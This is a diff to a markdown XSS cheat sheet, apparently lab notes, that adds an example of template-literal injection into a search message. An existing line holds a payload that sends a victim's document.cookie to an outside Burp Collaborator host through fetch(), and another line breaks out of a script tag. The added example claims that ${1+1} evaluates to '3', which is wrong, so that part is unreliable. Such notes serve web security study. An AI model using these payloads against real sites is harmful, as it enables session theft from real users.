@@ -75,6 +75,29 @@ storeId=kek"></select><script>alert(1)</script>
 \\"-fetch('http://burp.oastify.com?c='+btoa(document.cookie))}//
 ```
 
+**Injecting backtick string**
+```html
+<script>
+	var message = `0 search results for 'value'`;
+	document.getElementById('searchMessage').innerText = message;
+</script>
+```
+injection
+```js
+value = ${1+1}
+```
+injection executed
+```html
+<script>
+	var message = `0 search results for '${1+1}'`;
+	document.getElementById('searchMessage').innerText = message;
+</script>
+```
+result
+```js
+var message = "0 search results for '3'";
+```
+
 ---
 
 ### Stored DOM XSS (First Angle Bracket Bypass)
